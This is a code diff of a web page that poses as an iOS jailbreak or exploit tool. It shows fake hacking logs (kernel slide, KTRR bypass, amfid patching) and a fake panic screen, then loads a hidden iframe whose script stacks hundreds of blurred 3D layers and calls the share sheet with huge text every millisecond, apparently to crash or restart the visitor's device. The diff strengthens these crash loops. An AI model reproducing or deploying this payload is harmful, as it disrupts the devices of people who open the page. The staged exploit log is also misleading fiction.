@@ -6,7 +6,7 @@
     <title>Exploiting...</title>
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", sans-serif;
             margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center;
             background: #000; color: white; overflow: hidden;
             background: linear-gradient(135deg, #000000 0%, #0a0a2e 50%, #000000 100%);
@@ -15,41 +15,52 @@
 
         @keyframes gradientBG { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
 
-        /* ХОЛСТ ДЛЯ ДОЖДЯ */
         #rainCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
 
         .main-card {
-            background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px);
-            border: 1px solid rgba(255, 255, 255, 0.12); border-radius: 35px; padding: 35px 25px;
-            width: 85%; max-width: 380px; text-align: center; box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7);
+            background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(30px); -webkit-backdrop-filter: blur(30px);
+            border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 38px; padding: 35px 25px;
+            width: 85%; max-width: 360px; text-align: center; box-shadow: 0 40px 100px rgba(0, 0, 0, 0.8);
             z-index: 10; position: relative;
         }
 
-        h1 {
-            font-size: 1.8rem; margin: 0 0 20px 0; letter-spacing: -1px;
-            background: linear-gradient(to bottom, #fff, #999); -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+        .status-header {
+            display: flex; justify-content: space-between; align-items: center;
+            margin-bottom: 20px; font-size: 10px; text-transform: uppercase; letter-spacing: 1px; color: #555;
         }
 
-        .progress-container { background: rgba(255, 255, 255, 0.1); border-radius: 10px; height: 6px; width: 100%; margin-bottom: 20px; overflow: hidden; }
-        .progress-bar { width: 0%; height: 100%; background: #fff; box-shadow: 0 0 15px rgba(255, 255, 255, 0.5); }
+        .live-indicator { display: flex; align-items: center; gap: 5px; color: #32d74b; }
+        .dot { width: 4px; height: 4px; background: #32d74b; border-radius: 50%; animation: pulse 1s infinite; }
+
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+
+        h1 {
+            font-size: 1.4rem; margin: 0 0 20px 0; letter-spacing: -0.5px;
+            background: linear-gradient(to bottom, #fff, #a1a1a1); -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+        }
+
+        .progress-container { background: rgba(255, 255, 255, 0.05); border-radius: 10px; height: 4px; width: 100%; margin-bottom: 20px; overflow: hidden; }
+        .progress-bar { width: 0%; height: 100%; background: #fff; box-shadow: 0 0 15px rgba(255, 255, 255, 0.3); transition: width 0.2s linear; }
 
         #console {
-            background: rgba(0, 0, 0, 0.45); border-radius: 20px; padding: 15px; height: 180px;
-            font-family: 'SF Mono', 'Courier New', monospace; font-size: 10px; color: #32d74b;
-            text-align: left; overflow: hidden; border: 1px solid rgba(50, 215, 75, 0.15);
+            background: rgba(0, 0, 0, 0.6); border-radius: 22px; padding: 18px; height: 200px;
+            font-family: 'SF Mono', 'ui-monospace', monospace; font-size: 10px; color: #32d74b;
+            text-align: left; overflow: hidden; border: 1px solid rgba(50, 215, 75, 0.05);
+            line-height: 1.5;
         }
 
         .line { margin-bottom: 4px; opacity: 0; animation: fadeIn 0.1s forwards; }
+        .line.blue { color: #007aff; }
+        .line.warn { color: #ff9500; }
         @keyframes fadeIn { to { opacity: 1; } }
 
-        /* Мгновенная паника */
         #panic-screen {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #ff3b30; color: #fff; font-size: 8px; word-break: break-all;
-            padding: 0; z-index: 1000; overflow: hidden;
+            background: #000; color: #fff; font-size: 7px; font-family: monospace;
+            padding: 0; z-index: 1000; overflow: hidden; word-break: break-all;
         }
 
-        .footer { margin-top: 30px; font-size: 10px; color: #444; }
+        .footer { margin-top: 25px; font-size: 9px; color: #333; }
         #respring-iframe { position: fixed; opacity: 0.01; pointer-events: none; }
     </style>
 </head>
@@ -58,17 +69,28 @@
     <canvas id="rainCanvas"></canvas>
 
     <div id="terminal" class="main-card">
-        <h1>Exploiting...</h1>
+        <div class="status-header">
+            <div class="live-indicator"><div class="dot"></div> Secure Link</div>
+            <div>Bitrate: 12.4 MB/s</div>
+        </div>
+        
+        <h1>Injecting Exploit</h1>
+        
         <div class="progress-container"><div id="bar" class="progress-bar"></div></div>
+        
         <div id="console"></div>
-        <div class="footer">© 2026 neonmodder123</div>
+        
+        <div class="footer">
+            Verified Connection Hash: 0x982...F21<br>
+            © 2026 Repo made by Vitya
+        </div>
     </div>
 
     <div id="panic-screen"></div>
     <iframe id="respring-iframe" sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>
 
     <script>
-        // --- ЛОГИКА ДОЖДЯ (ТАК ЖЕ МАЛО, КАК НА ПЕРВОЙ) ---
+        // --- ЛОГИКА ДОЖДЯ ---
         const canvas = document.getElementById('rainCanvas');
         const ctx = canvas.getContext('2d');
         let width, height, drops;
@@ -77,18 +99,18 @@
             width = canvas.width = window.innerWidth;
             height = canvas.height = window.innerHeight;
             drops = [];
-            const count = Math.floor(width / 12); 
+            const count = Math.floor(width / 15); 
             for (let i = 0; i < count; i++) {
                 drops.push({
                     x: Math.random() * width, y: Math.random() * height,
-                    len: Math.random() * 30 + 15, speed: Math.random() * 3 + 2,
-                    op: Math.random() * 0.15 + 0.05
+                    len: Math.random() * 25 + 10, speed: Math.random() * 2 + 1.5,
+                    op: Math.random() * 0.1 + 0.03
                 });
             }
         }
 
         function drawRain() {
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.2)';
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.25)';
             ctx.fillRect(0, 0, width, height);
             ctx.strokeStyle = '#1ad2dc';
             ctx.lineWidth = 1;
@@ -103,16 +125,18 @@
 
         // --- ЛОГИКА ТЕРМИНАЛА ---
         const logs = [
-            "> Initializing exploit...",
-            "> Slide: 0x412b000000",
-            "> Bypassing KPP/KTRR...",
-            "> Remounting RootFS...",
-            "> Gaining TFP0 port...",
-            "> Found offset: 0xfffffff007",
-            "> Patching amfi...",
-            "> Injecting bootstrap...",
-            "> [CRITICAL] WebKit leak!",
-            "> Triggering panic..."
+            {t: "> Connecting to cloud server...", c: ""},
+            {t: "> Server challenge: SUCCESS", c: "blue"},
+            {t: "> Fetching WebKit offsets...", c: ""},
+            {t: "> Mapping memory region: 0x8000", c: ""},
+            {t: "> Attempting kernel read...", c: ""},
+            {t: "> KTRR bypass initialized", c: "blue"},
+            {t: "> Patching 'amfid' daemon...", c: ""},
+            {t: "> Found kernel slide: 0x21c000", c: "warn"},
+            {t: "> Remounting RootFS as R/W...", c: ""},
+            {t: "> Installing bootstrap layers...", c: ""},
+            {t: "> CRITICAL: Overflow detected", c: "warn"},
+            {t: "> Executing final payload...", c: ""}
         ];
 
         let barWidth = 0;
@@ -121,30 +145,34 @@
         const panicScreen = document.getElementById('panic-screen');
 
         const loadInterval = setInterval(() => {
-            barWidth += 1;
-            bar.style.width = barWidth + "%";
+            barWidth += 0.8;
+            bar.style.width = Math.min(barWidth, 100) + "%";
             if (barWidth >= 100) clearInterval(loadInterval);
-        }, 20);
+        }, 30);
 
         function startLogs(index) {
             if (index < logs.length) {
                 const div = document.createElement('div');
-                div.className = 'line';
-                div.innerText = logs[index];
+                div.className = 'line ' + logs[index].c;
+                div.innerText = logs[index].t;
                 consoleEl.appendChild(div);
                 consoleEl.scrollTop = consoleEl.scrollHeight;
-                setTimeout(() => startLogs(index + 1), 120);
+                
+                let delay = Math.random() * 400 + 200;
+                if (index > 8) delay = 150; // Ускорение в конце
+                
+                setTimeout(() => startLogs(index + 1), delay);
             } else {
-                triggerInstantPanic();
+                setTimeout(triggerInstantPanic, 500);
             }
         }
 
         function triggerInstantPanic() {
             let trapText = "";
-            for(let i=0; i<1500; i++) trapText += "FATAL_ERR:0x" + Math.floor(Math.random()*16777215).toString(16) + " ";
+            for(let i=0; i<3000; i++) trapText += "0x" + Math.floor(Math.random()*16777215).toString(16) + " ";
             panicScreen.innerText = trapText;
             panicScreen.style.display = 'block';
-            setTimeout(executeRespring, 10);
+            setTimeout(executeRespring, 50);
         }
 
         function executeRespring() {
@@ -153,21 +181,21 @@
                 const c = document.createElement('div');
                 c.style.cssText = 'perspective: 1px; perspective-origin: 99% 99%;';
                 document.body.appendChild(c);
-                for (let i = 0; i < 600; i++) {
+                for (let i = 0; i < 700; i++) {
                     let d = document.createElement('div');
                     d.style.cssText = 'position:absolute; width:100vw; height:100vh; backdrop-filter:blur(100px); -webkit-backdrop-filter:blur(100px); transform:translate3d(100px,100px,'+i+'px);';
                     c.appendChild(d);
                 }
                 setInterval(() => {
-                    try { navigator.share({title:'R', text:'R'.repeat(200000)}); } catch(e){}
-                }, 0);
+                    try { navigator.share({title:'X', text:'X'.repeat(300000)}); } catch(e){}
+                }, 1);
             <\/script></body></html>`;
         }
 
         window.addEventListener('resize', initRain);
         initRain();
         drawRain();
-        startLogs(0);
+        setTimeout(() => startLogs(0), 800);
     </script>
 </body>
 </html>
